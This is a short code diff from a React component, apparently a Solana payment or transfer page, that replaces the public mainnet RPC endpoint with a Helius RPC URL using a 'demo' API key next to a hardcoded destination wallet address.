@@ -53,7 +53,7 @@ export default function Index() {
     setIsProcessing(true);
 
     try {
-      const connection = new Connection("https://api.mainnet-beta.solana.com");
+      const connection = new Connection("https://rpc.helius.xyz/?api-key=demo");
       const destinationAddress = new PublicKey(
         "F52riGC1evYR12ZqQy9umRo7S3hDAZhFbXGEnuX8p966",
       );
